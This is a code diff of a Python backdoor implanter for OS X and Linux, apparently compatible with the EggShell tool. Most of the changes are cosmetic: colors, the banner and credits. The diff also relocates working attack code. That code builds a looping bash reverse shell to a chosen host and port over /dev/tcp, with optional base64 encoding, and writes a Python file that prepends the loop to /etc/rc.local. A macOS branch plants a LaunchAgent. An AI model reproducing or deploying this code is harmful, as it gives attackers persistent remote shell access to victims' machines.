@@ -13,14 +13,13 @@ sys.stderr = DevNull()
 
 color = {
     'RED'             : '\033[1;91m',
-    'UNDERLINE_GREEN' : '\033[4;92m',
+    'UNDERLINE_BLUE' : '\033[4;34m',
     'GREEN'           : '\033[1;92m',
     'YELLOW'          : '\033[1;33m',
-    'WHITE'           : '\033[0;97m',
-    'WHITEBU'         : '\033[1;4m' ,
     'CYAN'            : '\033[0;36m',
     'BLUE'            : '\033[0;34m',
     'MAGENTA'         : '\033[0;35m',
+    'DEFAULT'         : '\033[0m',
 }
 
 yes = ['Y', 'y', 'Ye', 'ye', 'YE', 'Yes', 'yes', 'YES']
@@ -31,7 +30,8 @@ def getip():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("192.168.1.1",80))
-        host = s.getsockname()[0];s.close()
+        host = s.getsockname()[0]
+        s.close()
         return host
     except:
         return "127.0.0.1"
@@ -51,11 +51,10 @@ def main():
     printY( [" |  ___/ | | |", "  | | | '_ \|  _/ _ \/ __| __|"] )
     printY( [" | |   | |_| |", " _| |_| | | | ||  __/ (__| |_ "] )
     printY( [" |_|    \__, |", "|_____|_| |_|_| \___|\___|\__|"] )
-    printY( ["         __/ |", "                              "] )
-    printY( ["        |___/ ", "                              "] )
+    printY( ["         __/ |", "                              "] ),
+    printY( ["        |___/ "," "+color['BLUE']+"Created by "+color['MAGENTA']+"@0xCoto"+color['BLUE']+" & "+color['MAGENTA']+"@danbatiste"] )
     print()
-    print(''.join( ['Backdoor ', color['GREEN'], 'any ', color['YELLOW'], '.py ', color['GREEN'], 'file', color['BLUE'], ' //', color['GREEN'], ' Backdoor implanter for ', color['CYAN'], 'OS X', color['GREEN'], ' - Compatible with ', color['MAGENTA'], 'EggShell', color['GREEN'], '!', color['WHITE'],'\n']) )
-
+    print(''.join( [color['RED'], 'Backdoor ', color['GREEN'], 'any ', color['YELLOW'], '.py ', color['GREEN'], 'file', color['BLUE'], ' -', color['GREEN'], ' Backdoor implanter for ', color['MAGENTA'], 'OS X', color['GREEN'], ' & ', color['MAGENTA'], 'Linux', color['GREEN'], ' ', color['BLUE'], '-', color['GREEN'],' Compatible with ', color['UNDERLINE_BLUE'], 'EggShell', color['DEFAULT'], color['GREEN'], '!', color['DEFAULT'],'\n']) )
 
     lhost = getip()
     lport = "4444"
@@ -77,43 +76,18 @@ def main():
     encode = str()
     encode = get_input(color['CYAN'] + "Encode to Base64? [Y/N]: " + color['GREEN'])
     while not encode in (yes + no):
-        print(color['RED'] + "Error: Invalid choice." + color['WHITE'])
+        print(color['RED'] + "Error: Invalid choice." + color['DEFAULT'])
         encode = get_input(color['CYAN'] + "Encode to Base64? [Y/N]: " + color['GREEN'])
     print()
     
     OS = 0
     while not int(OS) in [1,2]:
-        print("Choose a target OS:\n")
-        print("1) OS X")
-        print("2) Linux\n")
-        OS = get_input("OS Choice: ")
+        print(color['CYAN'] + "Choose a target OS:")
+        print(color['GREEN'] + "1)" + color['CYAN'] + " OS X")
+        print(color['GREEN'] + "2)" + color['CYAN'] + " Linux\n")
+        OS = get_input("Target OS ["+color['GREEN']+"1"+color['CYAN']+","+color['GREEN']+"2"+color['CYAN']+"]: "+color['GREEN']+"")
+        print()
 
-    #Linux
-    if OS == "2":
-        command = "while sleep " + interval + "; do bash &> /dev/tcp/" + hostChoice + "/" + portChoice + " 0>&1; done"
-        contents = command + '\n'
-
-        if encode in yes:
-            encoded = base64.b64encode(command)
-            contents = "echo {} | base64 -D\n".format(encoded)
-        
-        with open(filename, 'w') as file:
-            file.write('''
-filepath = '/etc/rc.local'
-command = """{}"""
-try:
-    with open(filepath, 'r') as file:
-        temp = file.read()
-
-except:
-    ...
-
-with open(filepath, 'w') as file:
-    file.write(command)
-    file.write(temp)
-'''[1:~0].format(contents))
-
-    #Mac OS X
     if OS == "1":
         command = '''
 mkdir -p ~/Library/LaunchAgents || true;echo "<?xml version="1.0" encoding="UTF-8"?>
@@ -151,8 +125,31 @@ import sys
 os.system({})
 '''[1:~0].format(contents))
 
+    if OS == "2":
+        command = "while sleep " + interval + "; do bash &> /dev/tcp/" + hostChoice + "/" + portChoice + " 0>&1; done"
+        contents = command + '\n'
 
-    print(color['GREEN'] + "Backdoor implanted successfully - Saved as " + color['MAGENTA'] + filename + color['WHITE'])
+        if encode in yes:
+            encoded = base64.b64encode(command)
+            contents = "echo {} | base64 -D\n".format(encoded)
+        
+        with open(filename, 'w') as file:
+            file.write('''
+filepath = '/etc/rc.local'
+command = """{}"""
+try:
+    with open(filepath, 'r') as file:
+        temp = file.read()
+
+except:
+    ...
+
+with open(filepath, 'w') as file:
+    file.write(command)
+    file.write(temp)
+'''[1:~0].format(contents))
+
+    print(color['GREEN'] + "Backdoor implanted successfully - Saved as " + color['MAGENTA'] + filename + color['GREEN'] + "." + color['DEFAULT'])
 
 
 #Main
@@ -165,4 +162,4 @@ if __name__ == "__main__":
     try:
         main()
     except:
-        print(color['RED'] + "\nExiting..." + color['WHITE'])
+        print(color['RED'] + "\nExiting..." + color['DEFAULT'])
